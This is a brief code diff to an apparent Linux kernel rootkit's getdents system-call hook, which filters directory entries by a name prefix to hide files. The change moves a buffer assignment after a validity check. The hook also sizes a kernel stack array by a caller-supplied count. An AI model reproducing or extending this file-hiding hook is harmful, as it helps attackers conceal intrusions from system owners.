@@ -321,7 +321,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   int nread = 0;
   unsigned int bpos = 0, i = 0, j = 0;
   struct linux_dirent *d = NULL;
-  char *user_buf = (char *) dirp;
+  char *user_buf = /*(char *) dirp*/ NULL;
   char starts_with_prefix = 0;
 
   printk(KERN_ALERT "getdents() hook invoked for %s.\n", current->comm);
@@ -334,6 +334,8 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   if (dirp == NULL || nread < 1) {
     return nread;
   }
+
+  user_buf = (char *) dirp;
 
 #pragma GCC diagnostic ignored "-Wdeclaration-after-statement"
   char k_buf[count];
